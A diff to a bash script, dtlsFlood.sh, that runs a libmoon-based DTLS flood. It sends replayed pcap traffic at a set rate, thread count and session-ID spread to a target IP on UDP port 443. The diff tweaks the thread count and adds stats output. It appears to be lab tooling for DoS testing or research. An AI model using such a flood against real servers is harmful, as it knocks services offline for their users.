@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration>
+# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration> [more args]
 # e.g.
 # sudo bash dtlsFlood.sh 172.31.116.132 172.31.116.137 1000 10 dtls_cisco.pcap 1000000 128
 
@@ -33,10 +33,11 @@ udpDst=443
 ############## Flood Start ##############
 
 $libmoonBuild/libmoon dtlsFlood.lua \
-    --seconds $seconds --threads 30 --rate $attackRate \
+    --seconds $seconds --threads 20 --rate $attackRate \
     --replayPcap $pcap \
     --sessionIDCount $sidCount --ipFlows $flows\
     --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
     --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
     --startConfirmation \
+    --outputDevStats stats.txt \
     0
